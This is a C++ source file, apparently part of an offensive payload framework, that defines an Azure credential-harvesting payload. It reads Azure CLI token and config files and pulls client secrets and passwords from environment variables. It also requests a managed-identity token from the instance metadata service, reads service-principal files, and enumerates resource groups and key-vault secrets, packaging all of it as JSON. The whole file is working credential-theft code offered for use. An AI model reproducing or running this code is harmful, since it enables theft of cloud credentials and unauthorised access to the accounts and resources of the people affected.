#include <cstdlib>
#include <string>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;
using json = nlohmann::json;

std::string user_home() {
    const char* h = getenv("HOME");
    return (h != nullptr) ? std::string(h) : std::string();
}

json enumerate_azure_resources() {
    json res = json::object();
    std::string az = which_exe("az");
    if (az.empty()) {
        res["error"] = "Azure CLI not found";
        return res;
    }

    CmdResult account = run_cmd_out({az, "account", "show"});
    if (account.ok) {
        json parsed = json::parse(account.out, nullptr, false);
        if (!parsed.is_discarded()) res["current_subscription"] = parsed;
    }

    CmdResult groups = run_cmd_out({az, "group", "list"});
    if (groups.ok) {
        json parsed = json::parse(groups.out, nullptr, false);
        if (parsed.is_array()) {
            json names = json::array();
            for (const auto& g : parsed) {
                if (names.size() >= 5) break;
                if (g.is_object() && g.contains("name") && g["name"].is_string())
                    names.push_back(g["name"]);
            }
            res["resource_groups"] = names;
        }
    }
    return res;
}

json check_key_vaults() {
    json vaults = json::array();
    std::string az = which_exe("az");
    if (az.empty()) return vaults;

    CmdResult out = run_cmd_out({az, "keyvault", "list"});
    if (!out.ok) return vaults;
    json parsed = json::parse(out.out, nullptr, false);
    if (!parsed.is_array()) return vaults;

    for (const auto& v : parsed) {
        if (vaults.size() >= 3) break;
        json vault_info = json::object();
        vault_info["name"] = v.contains("name") ? v["name"] : json(nullptr);
        vault_info["resourceGroup"] = v.contains("resourceGroup") ? v["resourceGroup"] : json(nullptr);
        vault_info["location"] = v.contains("location") ? v["location"] : json(nullptr);

        std::string name = (v.contains("name") && v["name"].is_string()) ? v["name"].get<std::string>() : "";
        if (!name.empty()) {
            CmdResult secrets = run_cmd_out({az, "keyvault", "secret", "list", "--vault-name", name});
            if (secrets.ok) {
                json sp = json::parse(secrets.out, nullptr, false);
                if (sp.is_array()) vault_info["secrets_count"] = (int)sp.size();
            }
        }
        vaults.push_back(vault_info);
    }
    return vaults;
}

class AzureCredHarvester : public Payload {
  public:
    const char* name() const override { return "azure_cred_harvester"; }
    const char* category() const override { return "credential"; }
    const char* description() const override {
        return "Harvest Azure tokens/credentials from metadata, env, CLI config";
    }

    Output execute(const Args&) const override {
        std::string home = user_home();
        OJ out = OJ::object();
        out["timestamp"] = now_rfc3339();

        json credentials = json::object();

        std::string data;
        if (read_file(home + "/.azure/config", data)) credentials["cli_config_raw"] = data;

        if (read_file(home + "/.azure/accessTokens.json", data)) {
            json tokens = json::parse(data, nullptr, false);
            if (!tokens.is_discarded()) credentials["cli_tokens"] = tokens;
        }

        if (read_file(home + "/.azure/azureProfile.json", data)) {
            json profile = json::parse(data, nullptr, false);
            if (!profile.is_discarded()) credentials["cli_profile"] = profile;
        }

        json env_creds = json::object();
        for (const char* v : {"AZURE_CLIENT_ID", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID",
                              "AZURE_SUBSCRIPTION_ID", "AZURE_USERNAME", "AZURE_PASSWORD"}) {
            const char* val = getenv(v);
            if (val != nullptr && *val != '\0') env_creds[v] = val;
        }
        if (!env_creds.empty()) credentials["environment"] = env_creds;

        HttpResponse resp = http_get(
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
            "&resource=https://management.azure.com/",
            {{"Metadata", "true"}});
        if (resp.ok && resp.status == 200) {
            json token_data = json::parse(resp.body, nullptr, false);
            if (token_data.is_object()) credentials["managed_identity"] = token_data;
        }

        struct SpFile {
            const char* path;
            bool as_json;
        };
        const SpFile sp_files[] = {
            {"/etc/azure/sp.txt", false},
            {"/var/azure/credentials.json", true},
        };
        for (const auto& spf : sp_files) {
            if (!read_file(spf.path, data)) continue;
            std::string base = std::string(spf.path);
            size_t pos = base.rfind('/');
            if (pos != std::string::npos) base = base.substr(pos + 1);
            if (spf.as_json) {
                json parsed = json::parse(data, nullptr, false);
                if (!parsed.is_discarded()) credentials["sp_" + base] = parsed;
            } else {
                credentials["sp_" + base] = data;
            }
        }

        out["credentials"] = credentials;

        out["resources"] = enumerate_azure_resources();
        json vaults = check_key_vaults();
        if (!vaults.empty()) out["key_vaults"] = vaults;

        std::string s = MarshalJSON(out);
        return Output(s.begin(), s.end());
    }
};

AzureCredHarvester g_azure;

struct Reg { Reg() { Register(&g_azure); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
